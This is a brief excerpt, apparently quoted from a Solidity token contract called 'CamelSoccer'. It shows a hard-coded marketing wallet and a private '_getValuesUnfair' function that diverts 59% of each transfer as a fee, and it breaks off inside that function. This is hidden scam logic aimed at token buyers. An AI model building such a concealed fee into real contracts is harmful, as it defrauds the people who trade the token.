...
contract CamelSoccer is Context, IERC20, Ownable {
    ...
    address private  _marketingWallet = 0x07A26A11e7a76038262A4579f434af1002920CD4;
    ...
    string private constant _name = "CamelSoccer"; 
    ...
    function _getValuesUnfair(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * 59 / 100; 
